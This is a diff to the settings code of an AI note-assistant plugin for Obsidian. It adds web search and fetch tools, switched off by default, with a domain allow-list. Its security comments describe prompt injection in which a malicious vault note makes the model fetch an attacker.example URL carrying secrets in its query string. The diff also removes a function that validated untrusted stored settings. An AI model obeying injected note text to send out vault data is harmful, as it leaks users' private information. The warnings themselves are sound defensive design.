@@ -21,8 +21,6 @@
 import { App, PluginSettingTab, Setting } from 'obsidian';
 import type { Provider } from '@skald/protocol';
 import type SkaldPlugin from './main';
-import { isProvider } from './provider-capabilities';
-import { validateOpenAiBaseUrl } from './openai-base-url';
 import { ANTHROPIC_MODELS, renderProviderSection } from './settings/provider';
 import { renderVaultSection } from './settings/vault';
 
@@ -121,6 +119,29 @@ export interface SkaldSettings {
    * Disable if a downstream model misreads TOON output.
    */
   compactToolResults: boolean;
+  /**
+   * Web tools (web_search + web_fetch).
+   *
+   * SECURITY: web_fetch is a prompt-injection EXFILTRATION CHANNEL. skald
+   * reads vault notes into the model context, and web_fetch lets the model
+   * issue an outbound HTTP GET to an arbitrary URL — a malicious note can
+   * instruct the model to fetch `https://attacker.example/?leak=<secrets>`,
+   * smuggling private vault data off-device in the query string. These
+   * tools run provider-side with no per-URL approval hook, so the only
+   * defenses are (1) not shipping the tools and (2) a domain allow-list.
+   *
+   * webToolsEnabled: master switch. Default FALSE (off) — the channel is
+   *   closed unless the operator explicitly opts in. When false, neither
+   *   web_search nor web_fetch is sent to the model.
+   * webFetchAllowedDomains: when web tools are on, restrict web_fetch to
+   *   these domains via Anthropic's native server-side `allowed_domains`
+   *   parameter (Anthropic enforces it; defense-in-depth on top of the
+   *   on/off gate). Empty = no domain restriction. NOTE: OpenRouter does
+   *   not currently enforce this list — on OpenRouter routes the on/off
+   *   gate is the load-bearing defense. See docs/security-model.md.
+   */
+  webToolsEnabled: boolean;
+  webFetchAllowedDomains: string[];
 }
 
 /** Re-export for backwards-compatible imports. */
@@ -151,102 +172,14 @@ export const DEFAULT_SETTINGS: SkaldSettings = {
   startersPath: 'Skald/Starters.md',
   thinkingEnabled: false,
   compactToolResults: true,
+  // SECURITY default: web tools OFF. web_fetch is a prompt-injection
+  // exfiltration channel in a vault-reading agent; the safe default is to
+  // not ship it. Operators opt in (and may add a domain allow-list) in
+  // Advanced settings. This default is an operator/product decision — see
+  // docs/security-model.md "Web tools and prompt-injection exfiltration".
+  webToolsEnabled: false,
+  webFetchAllowedDomains: [],
 };
-
-/**
- * Normalize a settings object loaded from disk into a fully-valid
- * SkaldSettings, treating the input as UNTRUSTED.
- *
- * data.json is operator-editable AND delivered by Obsidian Sync, so the
- * persisted blob is a trust boundary: a hand-edited or sync-corrupted file
- * can carry an unknown `provider` (which would otherwise reach the exhaustive
- * `switch (provider)` sites and throw via assertNever), non-string fields
- * (which would break downstream `.trim()`/string ops), missing keys, or a
- * cleartext non-loopback OpenAI base URL (which would leak prompts + the API
- * key over the wire, bypassing the https-enforcement that only runs on the
- * settings-UI save path).
- *
- * Normalization rules:
- *   - Start from DEFAULT_SETTINGS, then overlay only recognised keys.
- *   - `provider`: coerce any non-Provider value to the default ('anthropic').
- *   - string fields: keep only when the stored value is a string; otherwise
- *     fall back to the default.
- *   - boolean fields: keep only real booleans; otherwise default.
- *   - `openaiBaseUrl`: run validateOpenAiBaseUrl and CLAMP — if the persisted
- *     URL is insecure (cleartext non-loopback, bad scheme, unparseable),
- *     blank it so the utility/capture paths cannot dispatch over it.
- *
- * Valid settings round-trip unchanged.
- */
-export function normalizeSettings(stored: unknown): SkaldSettings {
-  const raw: Record<string, unknown> =
-    stored !== null && typeof stored === 'object'
-      ? (stored as Record<string, unknown>)
-      : {};
-
-  const out: SkaldSettings = { ...DEFAULT_SETTINGS };
-
-  // Pull a string field only when the stored value is actually a string;
-  // anything else (number, object, null, missing) falls back to the default.
-  const str = (key: keyof SkaldSettings): string => {
-    const v = raw[key as string];
-    return typeof v === 'string' ? v : (DEFAULT_SETTINGS[key] as string);
-  };
-  // Pull a boolean field only when the stored value is a real boolean.
-  const bool = (key: keyof SkaldSettings): boolean => {
-    const v = raw[key as string];
-    return typeof v === 'boolean' ? v : (DEFAULT_SETTINGS[key] as boolean);
-  };
-
-  // provider — coerce unknown values back to the safe default so they can
-  // never reach the exhaustive provider switches.
-  out.provider = isProvider(raw.provider)
-    ? raw.provider
-    : DEFAULT_SETTINGS.provider;
-
-  // String-typed settings.
-  out.anthropicApiKey = str('anthropicApiKey');
-  out.openrouterApiKey = str('openrouterApiKey');
-  out.openaiApiKey = str('openaiApiKey');
-  out.openaiModel = str('openaiModel');
-  out.defaultModel = str('defaultModel');
-  out.openrouterModel = str('openrouterModel');
-  out.harnessFolder = str('harnessFolder');
-  out.savedNotesFolder = str('savedNotesFolder');
-  out.chatsFolder = str('chatsFolder');
-  out.logsFolder = str('logsFolder');
-  out.memoryPath = str('memoryPath');
-  out.personasFolder = str('personasFolder');
-  out.activePersona = str('activePersona');
-  out.commandsFolder = str('commandsFolder');
-  out.capturesFolder = str('capturesFolder');
-  out.capturePromptPath = str('capturePromptPath');
-  out.startersPath = str('startersPath');
-
-  // utilityModel is optional (string | undefined). Keep a stored string,
-  // otherwise leave it as the default (empty string).
-  out.utilityModel =
-    typeof raw.utilityModel === 'string'
-      ? raw.utilityModel
-      : DEFAULT_SETTINGS.utilityModel;
-
-  // Boolean-typed settings.
-  out.memoryEnabled = bool('memoryEnabled');
-  out.thinkingEnabled = bool('thinkingEnabled');
-  out.compactToolResults = bool('compactToolResults');
-
-  // openaiBaseUrl — CLAMP against the https-enforcement rule. A hand-edited
-  // cleartext (non-loopback) URL would otherwise be used verbatim by the
-  // utility/capture/memory-upkeep paths, leaking prompts + key over the wire.
-  // Keep only a string that passes validateOpenAiBaseUrl; blank anything else.
-  const candidateBaseUrl =
-    typeof raw.openaiBaseUrl === 'string' ? raw.openaiBaseUrl : '';
-  out.openaiBaseUrl = validateOpenAiBaseUrl(candidateBaseUrl).ok
-    ? candidateBaseUrl
-    : '';
-
-  return out;
-}
 
 export class SkaldSettingTab extends PluginSettingTab {
   plugin: SkaldPlugin;
@@ -311,8 +244,75 @@ export class SkaldSettingTab extends PluginSettingTab {
             await this.plugin.saveSettings();
           });
         });
+
+      // Web tools (web_search + web_fetch) — SECURITY-sensitive, off by
+      // default. Toggling on re-renders so the allow-list field appears.
+      renderWebToolsSection(containerEl, this.plugin, redisplay);
     }
   }
+}
+
+/** Render the web-tools toggle plus, when enabled, the web_fetch domain
+ * allow-list. web_fetch is a prompt-injection exfiltration channel
+ * (see docs/security-model.md), so the toggle carries an explicit
+ * warning and the allow-list is offered as defense-in-depth. */
+function renderWebToolsSection(
+  containerEl: HTMLElement,
+  plugin: SkaldPlugin,
+  redisplay: () => void,
+): void {
+  new Setting(containerEl)
+    .setName('Web tools (web search + web fetch)')
+    .setDesc(
+      'Lets the model search the web and fetch URLs. SECURITY: web fetch can be ' +
+      'abused for data exfiltration — a malicious note in your vault can instruct ' +
+      'the model to fetch a URL with your vault contents in it, leaking data ' +
+      'off-device. Off by default. When on, set a domain allow-list below to ' +
+      'limit where fetches can go.',
+    )
+    .addToggle((t) => {
+      t.setValue(plugin.settings.webToolsEnabled).onChange(async (v) => {
+        plugin.settings.webToolsEnabled = v;
+        await plugin.saveSettings();
+        redisplay();
+      });
+    });
+
+  if (!plugin.settings.webToolsEnabled) return;
+
+  new Setting(containerEl)
+    .setName('Web fetch domain allow-list')
+    .setDesc(
+      'Comma- or newline-separated list of domains web fetch may access ' +
+      '(e.g. en.wikipedia.org, docs.anthropic.com). Enforced server-side by ' +
+      'Anthropic. Leave empty for the unrestricted "allow" mode — web fetch ' +
+      'may then reach ANY URL; choose this only if you accept the ' +
+      'exfiltration risk yourself. Note: OpenRouter does not enforce this ' +
+      'list; on OpenRouter the only protection is turning web tools off entirely.',
+    )
+    .addTextArea((ta) => {
+      ta.setPlaceholder('en.wikipedia.org\ndocs.anthropic.com');
+      ta.setValue(plugin.settings.webFetchAllowedDomains.join('\n'));
+      ta.onChange(async (raw) => {
+        plugin.settings.webFetchAllowedDomains = parseDomainList(raw);
+        await plugin.saveSettings();
+      });
+    });
+}
+
+/** Parse a free-text domain list (comma- and/or newline-separated) into a
+ * trimmed, de-duplicated array. Empty entries are dropped so a trailing
+ * separator or blank line never produces an empty `allowed_domains` entry
+ * (which Anthropic would read as "allow nothing"). */
+export function parseDomainList(raw: string): string[] {
+  return Array.from(
+    new Set(
+      raw
+        .split(/[\n,]/)
+        .map((d) => d.trim())
+        .filter((d) => d.length > 0),
+    ),
+  );
 }
 
 /** Render the Advanced toggle heading. Clicking it flips the expanded
